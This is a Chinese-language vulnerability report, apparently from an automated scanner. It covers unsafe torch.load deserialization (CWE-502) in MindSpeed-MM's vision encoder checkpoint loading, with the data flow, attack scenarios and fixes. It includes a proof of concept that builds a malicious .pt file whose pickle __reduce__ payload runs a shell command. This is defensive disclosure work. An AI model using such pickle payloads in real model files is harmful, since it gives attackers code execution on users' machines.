# VULN-DF-MM-DS-07: Vision Encoder 反序列化漏洞 (CWE-502)

## 漏洞概要

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-DF-MM-DS-07 |
| **漏洞类型** | 反序列化 (Deserialization) |
| **CWE编号** | CWE-502: Deserialization of Untrusted Data |
| **严重级别** | High |
| **置信度** | 85 |
| **影响版本** | MindSpeed-MM 全版本 |
| **CVSS 3.1 评分** | 7.8 (High) |

## 漏洞位置

### 主要触发点

**文件**: `/home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/mindspeed_mm/models/vision/vision_encoders/siglip_vit_model.py`

**行号**: 818

```python
if ckpt_path:
    state_dict = torch.load(ckpt_path, map_location="cpu")  # <-- 漏洞点：无 weights_only 参数
    
    incompatible_keys = model.load_state_dict(state_dict, strict=False)
    print(f"SigLIP-ViT restores from {ckpt_path},\n"
          f"\tincompatible_keys:', {incompatible_keys}.")
```

### 关联触发点

**文件**: `/home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/mindspeed_mm/models/vl_model.py`

**行号**: 330

```python
def _load_checkpoint(model, ckpt_path):
    if ckpt_path and len(ckpt_path) > 0:
        load_params = torch.load(ckpt_path, map_location="cpu")  # <-- 漏洞点：无 weights_only 参数
        print(model.load_state_dict(load_params, strict=False))
```

## 漏洞描述

MindSpeed-MM 模型框架在加载 Vision Encoder 模型权重时，使用 `torch.load()` 函数进行反序列化操作，但没有指定 `weights_only=True` 安全参数。默认情况下，`torch.load()` 使用 Python pickle 模块进行反序列化，允许执行任意代码。

`ckpt_path` 参数来自用户配置文件 `mm_model.json` 中的 `image_encoder.vision_encoder.ckpt_path` 字段，攻击者可以通过在配置文件中指定恶意 `.pt` 文件路径，诱导框架执行 pickle payload 中嵌入的任意代码。

## 攻击链路分析

### 数据流图

```
[外部配置] mm_model.json
     │
     │  image_encoder.vision_encoder.ckpt_path: "/path/to/malicious.pt"
     ▼
[配置加载] mindspeed_mm/configs/config.py:MMConfig
     │
     │  args.mm.model.image_encoder.vision_encoder.ckpt_path
     ▼
[路径检查] config.py:args_external_path_checker
     │         config.py:file_legality_checker (仅检查路径合法性)
     │         ⚠️ 不检查文件内容安全性
     ▼
[模型初始化] mindspeed_mm/models/vl_model.py:VLModel.__init__
     │
     │  第 72-73 行: 检查 ckpt_path 属性
     ▼
[权重加载] vl_model.py:_load_checkpoint (第 328-333 行)
     │
     │  或
     ▼
[权重加载] siglip_vit_model.py:create_siglip_vit (第 817-818 行)
     │
     │  torch.load(ckpt_path, map_location="cpu")
     ▼
[Pickle 反序列化] Python pickle.loads()
     │
     │  执行恶意 __reduce__ payload
     ▼
[代码执行] ⚠️ 远程代码执行 (RCE)
```

### 关键代码节点

#### 1. 配置文件入口 (validate_params.json:75)

```json
{
  "mm_model": {
    "params": [
      "image_encoder.vision_encoder.ckpt_path",
      ...
    ]
  }
}
```

用户可通过 `mm_model.json` 配置文件指定 `image_encoder.vision_encoder.ckpt_path` 字段。

#### 2. 配置加载 (config.py:72-109)

```python
class MMConfig:
    def __init__(self, files: dict) -> None:
        for name, path in files.items():
            if path == "":
                continue
            real_path = os.path.realpath(path)
            if real_path.endswith('.json'):
                config_dict = self.read_json(real_path)  # 加载 mm_model.json
            setattr(self, name, ConfigReader(config_dict))
```

#### 3. 模型初始化 (vl_model.py:72-73)

```python
# VLModel.__init__ 中检查 ckpt_path
if hasattr(config.image_encoder.vision_encoder, "ckpt_path") and hasattr(self.image_encoder, "encoder"):
    _load_checkpoint(self.image_encoder.encoder, config.image_encoder.vision_encoder.ckpt_path)
```

#### 4. 漏洞触发 (vl_model.py:328-333 或 siglip_vit_model.py:818)

```python
# vl_model.py 中的 _load_checkpoint 函数
def _load_checkpoint(model, ckpt_path):
    if ckpt_path and len(ckpt_path) > 0:
        load_params = torch.load(ckpt_path, map_location="cpu")  # 无 weights_only
        print(model.load_state_dict(load_params, strict=False))

# siglip_vit_model.py 中的 create_siglip_vit 函数
if ckpt_path:
    state_dict = torch.load(ckpt_path, map_location="cpu")  # 无 weights_only
```

## 安全检查分析

### file_legality_checker 的局限性

`config.py:218-256` 中的 `file_legality_checker` 函数仅执行以下检查：

1. **文件存在性检查**: `os.path.exists(file_path)`
2. **软链接检查**: `normalize_path()` 检查是否为符号链接
3. **路径遍历检查**: 检查路径是否在允许的目录范围内

**关键缺陷**: 这些检查仅验证路径的合法性，**不验证文件内容的安全性**。即使路径通过检查，文件内容中的恶意 pickle payload 仍可被执行。

```python
def file_legality_checker(file_path, param_name, base_dir=None):
    # 仅检查路径，不检查内容
    if not os.path.exists(file_path):
        return False
    
    norm_path, is_link = normalize_path(file_path)
    if is_link:
        print("WARNING: ...")
        return False
    
    # 检查路径遍历
    norm_path = os.path.realpath(file_path)
    base_directory = os.path.abspath(base_dir)
    if not norm_path.startswith(base_directory):
        print("WARNING: ...")
        return False
    
    return True  # ⚠️ 返回 True 不代表文件内容安全
```

## 漏洞利用场景

### 场景 1: 恶意模型文件植入

**攻击条件**:
- 攻击者能够访问用户配置的模型目录
- 用户在 `mm_model.json` 中指定了恶意文件路径

**攻击步骤**:
1. 攻击者制作包含恶意 payload 的 `.pt` 文件
2. 将文件放置在用户可访问的目录中
3. 用户修改 `mm_model.json` 配置文件，指定恶意文件路径
4. 用户运行训练脚本，框架加载恶意模型权重
5. `torch.load()` 执行 pickle payload，实现远程代码执行

### 场景 2: 配置文件篡改

**攻击条件**:
- 攻击者能够修改 `mm_model.json` 配置文件
- 指定的恶意文件路径通过 `file_legality_checker` 检查

**攻击步骤**:
1. 攻击者篡改 `mm_model.json`，修改 `image_encoder.vision_encoder.ckpt_path` 字段
2. 用户运行训练脚本
3. 框架加载恶意权重文件，触发代码执行

### 场景 3: 共享模型仓库攻击

**攻击条件**:
- 用户从共享模型仓库下载模型文件
- 下载的 `.pt` 文件被攻击者植入恶意 payload

**攻击步骤**:
1. 攻击者向共享模型仓库上传含有恶意 payload 的模型文件
2. 用户下载模型并配置路径
3. 框架加载模型，触发代码执行

## PoC 演示代码

### 恶意 .pt 文件生成

```python
import torch
import os
import pickle

class MaliciousPayload:
    """
    恶意 pickle payload 示例
    """
    def __reduce__(self):
        # 执行任意命令的 payload
        import subprocess
        return (subprocess.Popen, (['bash', '-c', 'id > /tmp/pwned.txt'],))

# 创建恶意 state_dict
malicious_state_dict = {
    '__payload__': MaliciousPayload(),
    'layer.weight': torch.randn(768, 1024),  # 正常权重数据
}

# 保存恶意 .pt 文件
torch.save(malicious_state_dict, 'malicious_vision_encoder.pt')
print("恶意模型文件已生成: malicious_vision_encoder.pt")
```

### 配置文件示例

```json
{
    "image_encoder": {
        "vision_encoder": {
            "model_id": "SigLip",
            "ckpt_path": "/path/to/malicious_vision_encoder.pt",
            ...
        },
        ...
    },
    ...
}
```

### 漏洞触发流程

```python
# 当用户运行训练脚本时:
# 1. 加载 mm_model.json 配置
# 2. VLModel.__init__ 检测到 ckpt_path
# 3. 调用 _load_checkpoint(model, ckpt_path)
# 4. torch.load(ckpt_path) 反序列化恶意 .pt 文件
# 5. pickle.loads() 执行 __reduce__ 方法
# 6. MaliciousPayload.__reduce__() 执行 subprocess.Popen
# 7. RCE: 在 /tmp/pwned.txt 中写入 id 命令结果
```

## 影响范围

### 受影响模块

| 模块 | 文件 | 行号 | 影响描述 |
|------|------|------|----------|
| Vision Encoder | `siglip_vit_model.py` | 818 | SigLIP ViT 模型权重加载 |
| VL Model | `vl_model.py` | 330 | Vision Encoder checkpoint 加载 |
| Vision Projector | `vl_model.py` | 77 | Projector checkpoint 加载 (同样存在风险) |
| Text Decoder | `vl_model.py` | 63 | Text Decoder checkpoint 加载 (同样存在风险) |

### 受影响入口脚本

根据 SECURITYNOTE.md，以下入口脚本可能触发此漏洞：

- `pretrain_vlm.py` - VLM 模型训练
- `pretrain_deepseekvl.py` - DeepSeek VL 模型训练
- `pretrain_internvl.py` - InternVL 模型训练
- `inference_vlm.py` - VLM 模型推理

### 受影响配置字段

```json
// mm_model.json 中可能触发漏洞的字段
{
    "image_encoder": {
        "vision_encoder": {
            "ckpt_path": "..."  // ← 漏洞触发点
        },
        "vision_projector": {
            "ckpt_path": "..."  // ← 同类风险点
        }
    },
    "text_decoder": {
        "ckpt_path": "..."  // ← 同类风险点
    }
}
```

## CVE 相关参考

### CVE-2025-32434

根据 SECURITYNOTE.md 的警告，即使设置 `weights_only=True`，在 PyTorch <= 2.5.1 版本中仍存在严重漏洞：

- 攻击者可利用旧版 `.tar` 格式模型文件绕过 `weights_only=True` 检查
- 成功利用可触发 RCE
- **建议**: 升级到 PyTorch > 2.5.1 版本

## 缓解措施

### 立即缓解

1. **升级 PyTorch 版本**: 升级到已修复 CVE-2025-32434 的版本 (> 2.5.1)

2. **添加 weights_only 参数**:

```python
# 修复方案 1: vl_model.py:330
def _load_checkpoint(model, ckpt_path):
    if ckpt_path and len(ckpt_path) > 0:
        load_params = torch.load(ckpt_path, map_location="cpu", weights_only=True)
        print(model.load_state_dict(load_params, strict=False))

# 修复方案 2: siglip_vit_model.py:818
if ckpt_path:
    state_dict = torch.load(ckpt_path, map_location="cpu", weights_only=True)
```

3. **使用 safetensors 格式**: 替换 `.pt/.pth` 文件为 `.safetensors` 格式

```python
from safetensors.torch import load_file

# 使用 safetensors 替代 torch.load
def _load_checkpoint_safe(model, ckpt_path):
    if ckpt_path and ckpt_path.endswith('.safetensors'):
        load_params = load_file(ckpt_path)
        print(model.load_state_dict(load_params, strict=False))
```

### 长期缓解

1. **完整性验证**: 使用 SHA-256 校验模型文件完整性

```python
import hashlib

def verify_checkpoint_integrity(ckpt_path, expected_hash):
    with open(ckpt_path, 'rb') as f:
        actual_hash = hashlib.sha256(f.read()).hexdigest()
    if actual_hash != expected_hash:
        raise SecurityError(f"Checkpoint integrity verification failed")
```

2. **来源可信**: 仅加载来自官方发布渠道的模型文件

3. **环境隔离**: 在隔离环境（容器/沙箱）中运行模型加载代码

4. **安全扫描**: 使用 pickle 专用扫描器检测模型文件

```bash
# 使用 picklescan 等工具检测恶意 pickle
pip install picklescan
picklescan -p malicious_model.pt
```

5. **增强路径检查**: 在 `file_legality_checker` 中添加内容验证

```python
def enhanced_checkpoint_validator(ckpt_path):
    # 1. 路径检查 (现有)
    if not file_legality_checker(ckpt_path, "ckpt_path"):
        return False
    
    # 2. 文件格式检查
    if not ckpt_path.endswith('.safetensors'):
        print("WARNING: Using pickle-based checkpoint format")
    
    # 3. 完整性检查 (可选)
    # verify_checksum(ckpt_path, expected_hash)
    
    return True
```

## 验证说明

### 漏洞确认依据

1. **代码审计确认**:
   - `siglip_vit_model.py:818` 存在 `torch.load(ckpt_path)` 无 `weights_only` 参数
   - `vl_model.py:330` `_load_checkpoint` 函数同样存在漏洞
   - `ckpt_path` 来源可追溯至 `mm_model.json` 配置文件

2. **数据流验证**:
   ```
   mm_model.json vision_encoder.ckpt_path 
   -> config.py:MMConfig 加载
   -> config.py:args_external_path_checker 路径检查(不检查内容)
   -> vl_model.py:VLModel.__init__ 检测 ckpt_path
   -> vl_model.py:_load_checkpoint 
   -> torch.load() -> pickle 反序列化 -> RCE
   ```

3. **安全检查局限性确认**:
   - `file_legality_checker` 仅检查路径合法性，不检查文件内容
   - 路径检查不能防止恶意 pickle payload 执行

4. **配置参数验证**:
   - `validate_params.json:75` 包含 `image_encoder.vision_encoder.ckpt_path`
   - 用户可通过配置文件控制加载路径

5. **PoC 验证可行性**:
   - 可生成包含恶意 `__reduce__` payload 的 `.pt` 文件
   - 通过配置文件指定路径可触发漏洞

## 结论

本漏洞是一个**真实有效的反序列化漏洞 (CWE-502)**，满足以下条件：

1. ✅ **存在不安全的反序列化操作**: `torch.load()` 无 `weights_only` 参数
2. ✅ **输入来源可控**: `ckpt_path` 来自用户配置文件 `mm_model.json`
3. ✅ **存在触发路径**: 完整的配置加载 → 模型初始化 → 权重加载链路
4. ✅ **可实现代码执行**: pickle `__reduce__` payload 可执行任意代码
5. ⚠️ **存在部分缓解**: `file_legality_checker` 检查路径，但不检查内容

**最终判定**: **真实漏洞 - 建议立即修复**

---

**报告生成时间**: 2026-04-20

**分析工具**: MindSpeed-MM 安全扫描系统

**参考文档**: 
- PyTorch torch.load 文档: https://pytorch.org/docs/main/generated/torch.load.html
- CWE-502: https://cwe.mitre.org/data/definitions/502.html
- CVE-2025-32434: PyTorch 安全漏洞
- MindSpeed-MM SECURITYNOTE.md: 数据安全声明
